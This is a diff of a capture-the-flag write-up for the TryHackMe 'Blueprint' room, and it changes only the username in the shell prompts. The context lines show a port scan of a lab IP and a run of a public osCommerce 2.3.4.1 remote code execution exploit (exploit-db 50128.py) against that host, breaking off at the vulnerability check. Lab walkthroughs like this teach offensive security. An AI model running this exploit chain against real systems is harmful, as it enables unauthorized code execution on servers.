@@ -13,7 +13,7 @@ Do you have what is takes to hack into this [Windows](../../3%20-%20Tags/Hacking
 We use [Rustscan](../../3%20-%20Tags/Hacking%20Tools/Rustscan.md) that will pass the result to [Nmap](../../3%20-%20Tags/Hacking%20Tools/Nmap.md) :
 
 ```
-┌──(hax㉿HaxonKali)-[~/THM/CHALLENGES/Easy/Blueprint]
+┌──(mdn0x㉿mdn0xonKali)-[~/THM/CHALLENGES/Easy/Blueprint]
 └─$ rustscan -a 10.10.124.215 -- -A 
 .----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
 | {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
@@ -26,7 +26,7 @@ ________________________________________
  --------------------------------------
 Scanning ports faster than you can say 'SYN ACK'
 
-[~] The config file is expected to be at "/home/hax/.rustscan.toml"
+[~] The config file is expected to be at "/home/mdn0x/.rustscan.toml"
 [!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
 [!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
 Open 10.10.124.215:80
@@ -217,7 +217,7 @@ If we search for OScommerce we find and exploit, let's try to use it :
 ```
 osCommerce 2.3.4.1 - Remote Code Execution (2)                                  | php/webapps/50128.py
 
-┌──(hax㉿HaxonKali)-[~/THM/CHALLENGES/Easy/Blueprint]
+┌──(mdn0x㉿mdn0xonKali)-[~/THM/CHALLENGES/Easy/Blueprint]
 └─$ locate 50128.py
 /usr/share/exploitdb/exploits/php/webapps/50128.py
 
@@ -229,7 +229,7 @@ chmod +x *.py
 Now let's run the [Python](../../3%20-%20Tags/Programming%20Languages/Python.md) [Exploit](../../3%20-%20Tags/Hacking%20Concepts/Exploit.md) and see what it asks for :
 
 ```
-──(hax㉿HaxonKali)-[~/THM/CHALLENGES/Easy/Blueprint]
+──(mdn0x㉿mdn0xonKali)-[~/THM/CHALLENGES/Easy/Blueprint]
 └─$ python3 50128.py          
 please specify the osCommerce url
 format: python3 osCommerce2_3_4RCE.py <url>
@@ -240,7 +240,7 @@ eg: python3 osCommerce2_3_4RCE.py http://localhost/oscommerce-2.3.4/catalog
 Let's do it :
 
 ```
-┌──(hax㉿HaxonKali)-[~/THM/CHALLENGES/Easy/Blueprint]
+┌──(mdn0x㉿mdn0xonKali)-[~/THM/CHALLENGES/Easy/Blueprint]
 └─$ python3 50128.py http://10.10.124.215:8080/oscommerce-2.3.4/catalog
 [*] Install directory still available, the host likely vulnerable to the exploit.
 [*] Testing injecting system command to test vulnerability
